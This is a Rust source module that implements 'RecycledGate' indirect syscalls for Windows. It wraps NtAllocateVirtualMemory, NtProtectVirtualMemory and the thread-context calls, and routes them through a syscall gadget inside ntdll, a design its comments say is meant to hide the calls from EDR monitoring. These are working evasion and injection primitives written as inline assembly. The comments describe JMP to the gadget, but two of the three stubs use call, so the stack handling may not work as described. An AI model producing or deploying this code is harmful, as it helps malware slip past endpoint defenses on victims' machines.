//! RecycledGate indirect syscall invocation.
//!
//! Instead of executing `syscall` from our DLL's code section (which would
//! leave our return address on the stack — detectable by EDR), we jump to a
//! `syscall; ret` gadget inside the *real* loaded ntdll. This makes the call
//! stack look like a legitimate ntdll-originated syscall.
//!
//! The assembly stubs below set up the syscall ABI (SSN in EAX, first arg in
//! R10) and then JMP to the gadget address. The `ret` inside ntdll returns
//! directly to our caller, so the stack is clean.

#[allow(unused_imports)] // Hash constants used on Windows for table lookups
use super::hash;
use super::table::SyscallTable;

/// Invoke NtAllocateVirtualMemory via indirect syscall.
///
/// # Safety
/// All parameters must be valid for the underlying NT syscall.
#[cfg(windows)]
pub unsafe fn nt_allocate_virtual_memory(
    table: &SyscallTable,
    process_handle: isize,
    base_address: *mut *mut u8,
    zero_bits: usize,
    region_size: *mut usize,
    allocation_type: u32,
    protect: u32,
) -> i32 {
    let entry = table
        .get(hash::NT_ALLOCATE_VIRTUAL_MEMORY)
        .expect("NtAllocateVirtualMemory not in syscall table");

    unsafe {
        indirect_syscall_6(
            entry.ssn,
            entry.gadget,
            process_handle as usize,
            base_address as usize,
            zero_bits,
            region_size as usize,
            allocation_type as usize,
            protect as usize,
        )
    }
}

/// Invoke NtProtectVirtualMemory via indirect syscall.
///
/// # Safety
/// All parameters must be valid for the underlying NT syscall.
#[cfg(windows)]
pub unsafe fn nt_protect_virtual_memory(
    table: &SyscallTable,
    process_handle: isize,
    base_address: *mut *mut u8,
    region_size: *mut usize,
    new_protect: u32,
    old_protect: *mut u32,
) -> i32 {
    let entry = table
        .get(hash::NT_PROTECT_VIRTUAL_MEMORY)
        .expect("NtProtectVirtualMemory not in syscall table");

    unsafe {
        indirect_syscall_5(
            entry.ssn,
            entry.gadget,
            process_handle as usize,
            base_address as usize,
            region_size as usize,
            new_protect as usize,
            old_protect as usize,
        )
    }
}

/// Invoke NtSetContextThread via indirect syscall.
///
/// # Safety
/// All parameters must be valid for the underlying NT syscall.
#[cfg(windows)]
pub unsafe fn nt_set_context_thread(
    table: &SyscallTable,
    thread_handle: isize,
    context: *const u8,
) -> i32 {
    let entry = table
        .get(hash::NT_SET_CONTEXT_THREAD)
        .expect("NtSetContextThread not in syscall table");

    unsafe {
        indirect_syscall_2(
            entry.ssn,
            entry.gadget,
            thread_handle as usize,
            context as usize,
        )
    }
}

/// Invoke NtGetContextThread via indirect syscall.
///
/// # Safety
/// All parameters must be valid for the underlying NT syscall.
#[cfg(windows)]
pub unsafe fn nt_get_context_thread(
    table: &SyscallTable,
    thread_handle: isize,
    context: *mut u8,
) -> i32 {
    let entry = table
        .get(hash::NT_GET_CONTEXT_THREAD)
        .expect("NtGetContextThread not in syscall table");

    unsafe {
        indirect_syscall_2(
            entry.ssn,
            entry.gadget,
            thread_handle as usize,
            context as usize,
        )
    }
}

// ── Inline assembly stubs ───────────────────────────────────────────────
// These use the Windows x64 syscall ABI:
//   - RAX = SSN (system service number)
//   - R10 = first argument (moved from RCX per NT convention)
//   - RCX, RDX, R8, R9 = args 1-4 (but arg1 goes in R10 for syscalls)
//   - Stack args at RSP+0x28, RSP+0x30, etc.
//
// Instead of `syscall`, we JMP to the gadget (syscall;ret) inside ntdll.
// The gadget's `ret` returns to our caller since we set up the stack frame.

/// 2-argument indirect syscall (e.g., NtSetContextThread, NtGetContextThread).
#[cfg(windows)]
#[inline(never)]
unsafe fn indirect_syscall_2(ssn: u16, gadget: usize, arg1: usize, arg2: usize) -> i32 {
    let result: i32;
    unsafe {
        std::arch::asm!(
            "mov r10, rcx",
            "mov eax, {ssn:e}",
            "jmp {gadget}",
            ssn = in(reg) ssn as u64,
            gadget = in(reg) gadget,
            in("rcx") arg1,
            in("rdx") arg2,
            lateout("rax") result,
            out("r10") _,
            out("r11") _,
            options(nostack),
        );
    }
    result
}

/// 5-argument indirect syscall (e.g., NtProtectVirtualMemory).
#[cfg(windows)]
#[inline(never)]
unsafe fn indirect_syscall_5(
    ssn: u16,
    gadget: usize,
    arg1: usize,
    arg2: usize,
    arg3: usize,
    arg4: usize,
    arg5: usize,
) -> i32 {
    let result: i32;
    unsafe {
        std::arch::asm!(
            "sub rsp, 0x38",
            "mov [rsp+0x28], {a5}",
            "mov r10, rcx",
            "mov eax, {ssn:e}",
            "call {gadget}",
            "add rsp, 0x38",
            ssn = in(reg) ssn as u64,
            gadget = in(reg) gadget,
            a5 = in(reg) arg5,
            in("rcx") arg1,
            in("rdx") arg2,
            in("r8") arg3,
            in("r9") arg4,
            lateout("rax") result,
            out("r10") _,
            out("r11") _,
            options(nostack),
        );
    }
    result
}

/// 6-argument indirect syscall (e.g., NtAllocateVirtualMemory).
#[cfg(windows)]
#[inline(never)]
#[allow(clippy::too_many_arguments)]
unsafe fn indirect_syscall_6(
    ssn: u16,
    gadget: usize,
    arg1: usize,
    arg2: usize,
    arg3: usize,
    arg4: usize,
    arg5: usize,
    arg6: usize,
) -> i32 {
    let result: i32;
    unsafe {
        std::arch::asm!(
            "sub rsp, 0x40",
            "mov [rsp+0x28], {a5}",
            "mov [rsp+0x30], {a6}",
            "mov r10, rcx",
            "mov eax, {ssn:e}",
            "call {gadget}",
            "add rsp, 0x40",
            ssn = in(reg) ssn as u64,
            gadget = in(reg) gadget,
            a5 = in(reg) arg5,
            a6 = in(reg) arg6,
            in("rcx") arg1,
            in("rdx") arg2,
            in("r8") arg3,
            in("r9") arg4,
            lateout("rax") result,
            out("r10") _,
            out("r11") _,
            options(nostack),
        );
    }
    result
}

// ── macOS stubs ─────────────────────────────────────────────────────────

#[cfg(not(windows))]
pub unsafe fn nt_allocate_virtual_memory(
    _table: &SyscallTable,
    _process_handle: isize,
    _base_address: *mut *mut u8,
    _zero_bits: usize,
    _region_size: *mut usize,
    _allocation_type: u32,
    _protect: u32,
) -> i32 {
    0 // STATUS_SUCCESS stub
}

#[cfg(not(windows))]
pub unsafe fn nt_protect_virtual_memory(
    _table: &SyscallTable,
    _process_handle: isize,
    _base_address: *mut *mut u8,
    _region_size: *mut usize,
    _new_protect: u32,
    _old_protect: *mut u32,
) -> i32 {
    0
}

#[cfg(not(windows))]
pub unsafe fn nt_set_context_thread(
    _table: &SyscallTable,
    _thread_handle: isize,
    _context: *const u8,
) -> i32 {
    0
}

#[cfg(not(windows))]
pub unsafe fn nt_get_context_thread(
    _table: &SyscallTable,
    _thread_handle: isize,
    _context: *mut u8,
) -> i32 {
    0
}

#[cfg(test)]
mod tests {
    use super::{
        SyscallTable, nt_allocate_virtual_memory, nt_get_context_thread, nt_protect_virtual_memory,
        nt_set_context_thread,
    };

    #[cfg(not(windows))]
    #[test]
    fn macos_stubs_return_success() {
        let table = SyscallTable::default();

        unsafe {
            let mut base: *mut u8 = std::ptr::null_mut();
            let mut size: usize = 0x1000;
            assert_eq!(
                nt_allocate_virtual_memory(&table, -1, &mut base, 0, &mut size, 0x3000, 0x04),
                0
            );
        }

        unsafe {
            let mut base: *mut u8 = std::ptr::null_mut();
            let mut size: usize = 0x1000;
            let mut old_protect: u32 = 0;
            assert_eq!(
                nt_protect_virtual_memory(&table, -1, &mut base, &mut size, 0x40, &mut old_protect),
                0
            );
        }

        unsafe {
            let mut ctx = [0u8; 16];
            assert_eq!(nt_set_context_thread(&table, -1, ctx.as_ptr()), 0);
            assert_eq!(nt_get_context_thread(&table, -1, ctx.as_mut_ptr()), 0);
        }
    }
}
